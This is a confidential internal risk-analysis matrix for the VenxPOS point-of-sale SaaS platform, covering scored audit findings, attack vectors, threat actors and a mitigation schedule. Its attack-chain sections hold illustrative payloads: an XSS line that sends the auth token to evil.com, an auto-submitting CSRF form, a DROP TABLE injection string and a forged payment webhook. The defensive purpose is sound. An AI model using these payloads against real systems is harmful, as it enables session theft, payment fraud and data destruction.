# VenxPOS SaaS — Risk Analysis Matrix

**Project**: VenxPOS SaaS Platform
**Version**: 0.1.0 (pre-production)
**Date**: 2026-06-19
**Classification**: Confidential — Engineering & Security Teams Only

---

## 1. Risk Assessment Methodology

This risk analysis uses a qualitative approach based on:

- **Probability (P)**: Likelihood of exploitation within 12 months of production deployment (1 = Rare, 2 = Unlikely, 3 = Possible, 4 = Likely, 5 = Almost Certain)
- **Impact (I)**: Business impact if exploited (1 = Negligible, 2 = Minor, 3 = Moderate, 4 = Major, 5 = Catastrophic)
- **Risk Score**: P × I (≥15 = Critical, 10–14 = High, 6–9 = Medium, 1–5 = Low)

Each finding from the Security Audit Report (`docs/SECURITY_REPORT.md`) is mapped to this matrix.

---

## 2. Risk Matrix (Probability × Impact)

### Risk Heat Map

| Risk Score | 1 (Rare) | 2 (Unlikely) | 3 (Possible) | 4 (Likely) | 5 (Almost Certain) |
|-----------|----------|-------------|-------------|-----------|-------------------|
| **5 Catastrophic** | 5 LOW | 10 HIGH | **15 CRIT** | **20 CRIT** | **25 CRIT** |
| **4 Major** | 4 LOW | 8 MED | 12 HIGH | **16 CRIT** | **20 CRIT** |
| **3 Moderate** | 3 LOW | 6 MED | 9 MED | 12 HIGH | 15 CRIT |
| **2 Minor** | 2 LOW | 4 LOW | 6 MED | 8 MED | 10 HIGH |
| **1 Negligible** | 1 LOW | 2 LOW | 3 LOW | 4 LOW | 5 LOW |

### Finding Risk Scores

| ID | Finding | P | I | Score | Risk Level |
|----|---------|---|---|-------|------------|
| CRIT-001 | PIN stored in plaintext | 3 (Possible) | 5 (Catastrophic) | **15** | **CRITICAL** |
| CRIT-002 | No rate limiting on login | 4 (Likely) | 4 (Major) | **16** | **CRITICAL** |
| CRIT-003 | service_role exposed in scripts | 3 (Possible) | 5 (Catastrophic) | **15** | **CRITICAL** |
| CRIT-004 | No CSRF protection (SaaS) | 4 (Likely) | 4 (Major) | **16** | **CRITICAL** |
| CRIT-005 | No webhook signature verification | 3 (Possible) | 5 (Catastrophic) | **15** | **CRITICAL** |
| HIGH-001 | JWT in localStorage | 4 (Likely) | 3 (Moderate) | **12** | **HIGH** |
| HIGH-002 | No session timeout | 3 (Possible) | 3 (Moderate) | **9** | **MEDIUM** |
| HIGH-003 | Password min 6 chars | 4 (Likely) | 3 (Moderate) | **12** | **HIGH** |
| HIGH-004 | Email confirmations disabled | 3 (Possible) | 3 (Moderate) | **9** | **MEDIUM** |
| HIGH-005 | No CSP for SaaS web | 3 (Possible) | 4 (Major) | **12** | **HIGH** |
| HIGH-006 | empresas missing RLS policies | 2 (Unlikely) | 4 (Major) | **8** | **MEDIUM** |
| HIGH-007 | Payment hash client-side | 3 (Possible) | 3 (Moderate) | **9** | **MEDIUM** |
| MED-001 | Errors expose internal structure | 4 (Likely) | 2 (Minor) | **8** | **MEDIUM** |
| MED-002 | No structured logging | 3 (Possible) | 2 (Minor) | **6** | **MEDIUM** |
| MED-003 | No backup strategy | 2 (Unlikely) | 5 (Catastrophic) | **10** | **HIGH** |
| MED-004 | No MFA | 3 (Possible) | 3 (Moderate) | **9** | **MEDIUM** |
| LOW-001 | Pre-release dependencies | 2 (Unlikely) | 2 (Minor) | **4** | **LOW** |
| LOW-002 | refresh_token in Zustand | 3 (Possible) | 2 (Minor) | **6** | **MEDIUM** |

### Recalibrated Severity (after risk scoring)

| Original | Recalibrated | Findings |
|----------|-------------|----------|
| HIGH-002 (No session timeout) | **MEDIUM** (9) | Moved down due to lower impact |
| HIGH-004 (Email confirmations) | **MEDIUM** (9) | Moved down due to lower impact |
| HIGH-006 (empresas RLS missing) | **MEDIUM** (8) | Moved down due to lower probability of exploit |
| HIGH-007 (Payment hash client-side) | **MEDIUM** (9) | Moved down due to lower impact |
| MED-003 (No backup strategy) | **HIGH** (10) | Moved UP due to catastrophic data loss potential |
| LOW-002 (refresh_token in Zustand) | **MEDIUM** (6) | Moved up due to higher probability in web context |

---

## 3. Attack Vector Analysis

### AV-1: Brute Force / Credential Stuffing

| Attribute | Detail |
|-----------|--------|
| **Target** | Authentication endpoint (`src/components/Login.tsx:16-51`) |
| **Related Findings** | CRIT-002, HIGH-003 |
| **Attack Scenario** | Attacker uses automated tools (Hydra, Burp Intruder) to try common credentials against user accounts |
| **Existing Controls** | Supabase rate limit: 30 sign-ins per 5 min per IP (`supabase/config.toml:202`) |
| **Control Gaps** | No account lockout, no CAPTCHA, no progressive delay, password min length = 6 |
| **Exploit Difficulty** | Medium — requires valid email addresses (enumerable via sign-up error messages) |
| **Worst-Case Outcome** | Admin account compromised → full system control, financial fraud, data theft |
| **Detection Capability** | None — no structured logging of failed login attempts |

**Attack Chain**:
```
1. Enumerate valid emails via signup endpoint error differentiation
2. Launch distributed brute force from multiple IPs to bypass rate limiting
3. Gain access to cajero account → escalate to admin via stored PIN (CRIT-001)
4. Exfiltrate sales data, modify inventory, issue fraudulent refunds
```

---

### AV-2: Cross-Site Scripting (XSS)

| Attribute | Detail |
|-----------|--------|
| **Target** | SaaS web application (React SPA) |
| **Related Findings** | HIGH-001, HIGH-005, LOW-002 |
| **Attack Scenario** | Attacker injects malicious JavaScript through an unsanitized input field or URL parameter |
| **Existing Controls** | React's built-in JSX escaping (auto-sanitizes `{}` interpolation), Tauri CSP |
| **Control Gaps** | No CSP for SaaS web app, JWT in localStorage (HIGH-001), no `dangerouslySetInnerHTML` audits |
| **Exploit Difficulty** | Medium-High — React provides strong default protection, but third-party deps or custom `innerHTML` usage could introduce vectors |
| **Worst-Case Outcome** | JWT token exfiltration → session hijacking → unauthorized transactions |

**Attack Chain**:
```
1. Find XSS vector (e.g., product description with HTML, QR code with malicious payload)
2. Inject: <img src=x onerror="fetch('https://evil.com/steal?t='+localStorage.getItem('sb-beacnoxukkoellhecofm-auth-token'))">
3. Attacker receives JWT access_token + refresh_token
4. Attacker authenticates as victim, issues fraudulent sales or refunds
5. Attacker maintains access via refresh_token rotation (token valid until revoked)
```

---

### AV-3: Cross-Site Request Forgery (CSRF)

| Attribute | Detail |
|-----------|--------|
| **Target** | All authenticated API endpoints |
| **Related Findings** | CRIT-004 |
| **Attack Scenario** | Attacker hosts a malicious website that auto-submits a form or fetch request to the VenxPOS SaaS API, leveraging the victim's authenticated session |
| **Existing Controls** | None for the SaaS web application |
| **Control Gaps** | No CSRF tokens, no SameSite cookie enforcement verification, JWT in localStorage accessible to any same-origin script |
| **Exploit Difficulty** | Low-Medium — requires victim to visit attacker's site while logged into VenxPOS |
| **Worst-Case Outcome** | Unauthorized actions: create admin users, modify prices, delete inventory, issue refunds |

**Attack Chain**:
```
1. Attacker crafts a page at evil.com with:
   <form action="https://app.venxpos.com/api/ventas" method="POST">
     <input name="total" value="0.01">
   </form>
   <script>document.forms[0].submit();</script>
2. Victim (logged into VenxPOS) visits evil.com
3. Browser auto-includes Authorization header or cookies → request succeeds
4. Fraudulent sale recorded with minimal amount → appears in tax reports
```

---

### AV-4: SQL Injection (via RLS bypass)

| Attribute | Detail |
|-----------|--------|
| **Target** | Supabase PostgreSQL database |
| **Related Findings** | HIGH-006 |
| **Attack Scenario** | Attacker crafts malicious SQL through application inputs that bypass parameterized queries |
| **Existing Controls** | Supabase JS client uses parameterized queries (prepared statements), RLS enabled on all tables |
| **Control Gaps** | `empresas` and `sucursales` tables have incomplete RLS policies, RPC functions use `SECURITY DEFINER` (potential privilege escalation vector) |
| **Exploit Difficulty** | Low — Supabase JS client prevents classic SQL injection |
| **Worst-Case Outcome** | If an injection vector is found in an RPC function or migration script, full database access |

**Attack Chain**:
```
1. Attacker identifies an RPC function with dynamic SQL construction
2. Crafts malicious parameter: {"p_producto_id": "'; DROP TABLE ventas; --"}
3. If function uses EXECUTE with string concatenation instead of parameterized queries, injection succeeds
4. Data exfiltration, modification, or deletion
```

**Current Protection Assessment**: The two existing RPC functions (`decrementar_inventario`, `incrementar_inventario`) use parameterized PL/pgSQL variables and are not vulnerable. However, any future Edge Functions or RPCs must be audited.

---

### AV-5: Webhook Spoofing (Wompi Payment Fraud)

| Attribute | Detail |
|-----------|--------|
| **Target** | Wompi webhook endpoint (Edge Function) |
| **Related Findings** | CRIT-005 |
| **Attack Scenario** | Attacker discovers the webhook endpoint URL and sends forged payment confirmation events |
| **Existing Controls** | None for the SaaS application |
| **Control Gaps** | No HMAC signature verification, no IP allowlisting, no idempotency tracking |
| **Exploit Difficulty** | Medium — attacker must discover webhook URL (enumeration via DNS/reverse proxy logs) |
| **Worst-Case Outcome** | Financial fraud: attacker marks unpaid orders as paid, receives goods/services without payment |

**Attack Chain**:
```
1. Attacker enumerates webhook URL from JavaScript source maps or error messages
2. Crafts a Wompi-compatible JSON payload with:
   {
     "event": "transaction.updated",
     "data": {
       "transaction": {
         "id": "real-transaction-id",
         "status": "APPROVED",
         "amount_in_cents": 99999900
       }
     }
   }
3. Sends POST to webhook endpoint without valid HMAC signature
4. If signature is not verified, Edge Function processes as legitimate
5. System marks order as paid, releases goods, records revenue
6. Actual Wompi transaction shows no payment — financial loss
```

---

### AV-6: Privilege Escalation (cajero → admin)

| Attribute | Detail |
|-----------|--------|
| **Target** | Role-based access control (RBAC) system |
| **Related Findings** | CRIT-001, HIGH-002 |
| **Attack Scenario** | A cashier (cajero) user exploits application weaknesses to gain admin-level access |
| **Existing Controls** | RLS policies check `is_admin()` for admin-only operations, separate roles in `usuarios.rol` |
| **Control Gaps** | PIN stored in plaintext (CRIT-001) — a cajero with access to the `usuarios` table via leaked credentials can read any admin's PIN, no session timeout (HIGH-002) — an unattended admin session can be used by a cajero |
| **Exploit Difficulty** | Medium — requires physical access to admin session or DB access |
| **Worst-Case Outcome** | Unauthorized admin actions: void legitimate sales, adjust inventory to conceal theft, modify prices |

**Attack Chain**:
```
1. Cajero finds unattended admin terminal (no session timeout — HIGH-002)
2. Performs admin-level actions (void sales, adjust inventory)
    OR
3. Cajero obtains database access (e.g., compromised credential, shared password)
4. Queries: SELECT pin_acceso FROM usuarios WHERE rol = 'admin' — returns plaintext PIN
5. Uses admin PIN in AdminOverrideModal to authorize sensitive operations
```

---

## 4. Attack Surface Mapping

### 4.1 Frontend (React 19 SPA)

| Surface | Exposure | Authentication | Key Risks |
|---------|----------|---------------|-----------|
| Login page | Public | None | Brute force (CRIT-002) |
| POS dashboard | Authenticated | JWT in localStorage | XSS token theft (HIGH-001) |
| Payment modal | Authenticated | JWT in localStorage | Client-side hash tampering (HIGH-007) |
| Admin override modal | Authenticated | PIN verification | Plaintext PIN in DB (CRIT-001) |
| Config panel | Authenticated (admin) | JWT + is_admin() | Privilege escalation |
| Tauri WebView | Local desktop | JWT in localStorage | CSP bypass via Tauri API |

**Frontend Attack Surface Size**: ~38 component files, ~3000 lines of TypeScript/TSX

### 4.2 API / Edge Functions (Supabase)

| Surface | Exposure | Authentication | Key Risks |
|---------|----------|---------------|-----------|
| Supabase REST API | Public (anon key) | JWT / RLS | RLS bypass (HIGH-006) |
| Supabase Auth API | Public | Email/password | Brute force, no CAPTCHA |
| Wompi webhook endpoint | Public (URL-guessable) | Expected: HMAC, Actual: None | Webhook spoofing (CRIT-005) |
| Resend email webhook endpoint | Public (URL-guessable) | Expected: HMAC, Actual: TBD | Email event spoofing |
| Supabase Realtime | Authenticated | JWT | Data leakage via WebSocket |

**API Attack Surface Size**: REST API (PostgREST), Auth (Gotrue), Realtime, Storage, Edge Functions

### 4.3 Database (PostgreSQL 17)

| Surface | Exposure | Authentication | Key Risks |
|---------|----------|---------------|-----------|
| `usuarios` table | RLS-scoped | JWT via PostgREST | Plaintext PIN (CRIT-001) |
| `empresas` table | RLS-enabled, no write policies | JWT via PostgREST | Missing policies (HIGH-006) |
| `ventas` table | RLS-scoped | JWT via PostgREST | Client-computed hash (HIGH-007) |
| `auth.users` | Supabase-managed | Internal | Password hashing (bcrypt/scrypt) |
| `eventos_auditoria` | RLS-scoped | JWT via PostgREST | Log tampering if not append-only |
| Direct PostgreSQL connection | Network-restricted | Password/SSL | Credential exposure |

**Database Attack Surface Size**: 15 tables, 2 RPC functions, 30+ RLS policies, 25+ indices

### 4.4 Third-Party Integrations

| Integration | Data Flow | Secret Storage | Key Risks |
|------------|-----------|---------------|-----------|
| Wompi (Payments) | API calls + webhooks | Event secret (not yet stored) | Webhook spoofing (CRIT-005) |
| Resend (Email) | API calls | API key (TBD) | Email spoofing |
| Supabase (Hosting) | Full platform | Anon key (client), Service role (server) | Service role exposure (CRIT-003) |
| NPM Registry | Build-time | None (public) | Supply chain attacks (LOW-001) |

---

## 5. Threat Actor Analysis

### TA-1: External Attacker (Script Kiddie / Opportunistic)

| Attribute | Detail |
|-----------|--------|
| **Motivation** | Financial gain, notoriety |
| **Capability** | Low — uses off-the-shelf tools, publicly known exploits |
| **Target Assets** | User credentials, payment data, customer PII |
| **Likely Vectors** | Brute force (AV-1), XSS (AV-2), CSRF (AV-3) |
| **Risk Level** | Moderate — high volume, low sophistication |
| **Mitigation Focus** | Rate limiting, CAPTCHA, CSP, input validation |

### TA-2: Sophisticated Attacker (Organized Crime)

| Attribute | Detail |
|-----------|--------|
| **Motivation** | Financial fraud, tax evasion, money laundering |
| **Capability** | High — custom tools, persistence, multi-stage attacks |
| **Target Assets** | Payment system, transaction integrity, Wompi integration |
| **Likely Vectors** | Webhook spoofing (AV-5), SQL injection (AV-4), supply chain (LOW-001) |
| **Risk Level** | High — focused on financial manipulation |
| **Mitigation Focus** | Webhook signature verification, RLS hardening, dependency auditing |

### TA-3: Malicious Tenant (Competing Business)

| Attribute | Detail |
|-----------|--------|
| **Motivation** | Competitive intelligence, sabotage, market advantage |
| **Capability** | Medium — legitimate access to own tenant, attempts cross-tenant access |
| **Target Assets** | Other tenants' sales data, pricing, inventory, customer lists |
| **Likely Vectors** | RLS bypass (HIGH-006), privilege escalation (AV-6) |
| **Risk Level** | High — insider access amplifies impact |
| **Mitigation Focus** | RLS completeness, tenant isolation verification, audit logging |

### TA-4: Compromised Employee / Insider Threat

| Attribute | Detail |
|-----------|--------|
| **Motivation** | Personal financial gain, disgruntlement |
| **Capability** | High — legitimate credentials, system familiarity, physical access |
| **Target Assets** | Cash register data, inventory, admin PINs, sales records |
| **Likely Vectors** | Privilege escalation (AV-6), session hijacking (HIGH-002) |
| **Risk Level** | High — difficult to detect, bypasses perimeter defenses |
| **Mitigation Focus** | MFA (MED-004), session timeout (HIGH-002), audit logging (MED-002), PIN hashing (CRIT-001) |

---

## 6. Data Classification & Protection Requirements

| Data Category | Tables Affected | Sensitivity | Regulatory Requirement |
|--------------|----------------|-------------|----------------------|
| Authentication credentials | `auth.users`, `usuarios.pin_acceso` | **Critical** | PCI-DSS, Colombian Habeas Data Law |
| Financial transactions | `ventas`, `cierres_caja`, `devoluciones` | **Critical** | DIAN electronic invoicing, tax audit trail |
| Personal data (PII) | `usuarios.nombre`, `auth.users.email` | **High** | Ley 1581 de 2012 (Colombia), GDPR (if EU customers) |
| Business data | `productos`, `inventario_sucursal`, `categorias` | **Medium** | Trade secret protection |
| Tax configuration | `configuracion_fiscal` | **High** | DIAN compliance, audit trail |
| Audit logs | `eventos_auditoria` | **Medium** | Security monitoring, forensic analysis |

---

## 7. Mitigation Priorities & Timeline

### Phase 0: Pre-Launch (Next 2 Weeks) — Critical Only

| Priority | Finding | Action | Effort | Owner |
|----------|---------|--------|--------|-------|
| P0 | CRIT-001 | Hash all PINs with PBKDF2, update AdminOverrideModal | 3 days | Backend |
| P0 | CRIT-003 | Rotate service_role key, move to env vars, add .gitignore rules | 1 day | DevOps |
| P0 | CRIT-005 | Implement Wompi webhook HMAC verification in Edge Function | 2 days | Backend |
| P0 | CRIT-002 | Enable CAPTCHA, add client-side backoff, configure account lockout | 3 days | Full-stack |
| P0 | CRIT-004 | Add CSP headers, CSRF tokens, security headers for SaaS web | 2 days | DevOps/Frontend |

### Phase 1: Launch Sprint (Weeks 2–4) — High Severity

| Priority | Finding | Action | Effort | Owner |
|----------|---------|--------|--------|-------|
| P1 | HIGH-004 | Enable email confirmations, configure Resend SMTP | 2 days | DevOps |
| P1 | HIGH-005 | Implement CSP, security headers for production deployment | 1 day | DevOps |
| P1 | HIGH-006 | Add INSERT/UPDATE/DELETE RLS policies for empresas and sucursales | 2 days | Backend |
| P1 | HIGH-001 | Move JWT to httpOnly cookies for SaaS web (or encrypt for Tauri) | 3 days | Full-stack |
| P1 | HIGH-003 | Strengthen password policy (min 10 chars + complexity requirements) | 1 day | DevOps |
| P1 | MED-003 | Enable Supabase PITR, set up pg_dump to S3, document RPO/RTO | 2 days | DevOps |

### Phase 2: Post-Launch (Weeks 4–6) — Medium Severity

| Priority | Finding | Action | Effort | Owner |
|----------|---------|--------|--------|-------|
| P2 | HIGH-002 | Configure session timeouts (12h timebox, 2h inactivity) | 1 day | DevOps |
| P2 | HIGH-007 | Move sale hash computation to server-side PostgreSQL function | 2 days | Backend |
| P2 | MED-001 | Implement centralized error sanitization middleware | 2 days | Frontend |
| P2 | MED-002 | Set up structured logging with log levels and SIEM integration | 3 days | DevOps |
| P2 | MED-004 | Enable TOTP-based MFA for admin users | 3 days | Full-stack |

### Phase 3: Security Hardening (Weeks 6–8) — Low Severity

| Priority | Finding | Action | Effort | Owner |
|----------|---------|--------|--------|-------|
| P3 | LOW-001 | Pin dependency versions, set up Dependabot/npm audit in CI | 1 day | DevOps |
| P3 | LOW-002 | Remove refresh_token from Zustand store, rely on Supabase client | 1 day | Frontend |

---

## 8. Residual Risk Acceptance

After all mitigations are applied, the following residual risks must be formally accepted by management:

| Residual Risk | Justification | Compensating Control |
|---------------|--------------|---------------------|
| Insider threat (admin) | Admins inherently have broad access | MFA, audit logging, session timeout |
| Zero-day in React/Vite/Supabase | Cannot prevent unknown vulnerabilities | Defense in depth, rapid patching process |
| Physical access to POS terminal | Tauri desktop app runs locally | Device encryption, OS-level access control |
| Supply chain compromise (npm) | Complex dependency tree | npm audit, lockfile integrity, SBOM |
| Third-party breach (Supabase/Wompi) | Data processing dependency | Contractual SLAs, incident response plan |

---

## 9. Risk Register Dashboard

### Overall Risk Distribution

```
Critical (≥15): ██████████ 28% (5 findings)
High (10–14):   ██████     17% (3 findings)
Medium (6–9):   ████████████████ 44% (8 findings)
Low (1–5):      ████       11% (2 findings)
```

### Risk by Category

| Category | Critical | High | Medium | Low |
|----------|----------|------|--------|-----|
| Authentication | 1 | 3 | 1 | 0 |
| Authorization | 0 | 1 | 1 | 0 |
| Data Protection | 1 | 1 | 1 | 1 |
| API Security | 2 | 1 | 0 | 0 |
| Infrastructure | 1 | 0 | 2 | 1 |
| Third-Party | 1 | 0 | 0 | 0 |

### Risk by Attack Vector

| Attack Vector | Max Severity | Status |
|---------------|-------------|--------|
| Webhook spoofing | Critical (CRIT-005) | Unmitigated |
| Brute force | Critical (CRIT-002) | Partially mitigated (server rate limit) |
| CSRF | Critical (CRIT-004) | Unmitigated for SaaS |
| Privilege escalation | Critical (CRIT-001) | Unmitigated |
| XSS | High (HIGH-001, HIGH-005) | Partially mitigated (React escaping) |
| SQL injection | Medium (HIGH-006) | Well mitigated (parameterized queries) |
| Supply chain | Low (LOW-001) | Standard npm risk |

---

*This risk analysis is a living document. It must be reviewed and updated quarterly, after any major architectural change, and after any security incident.*
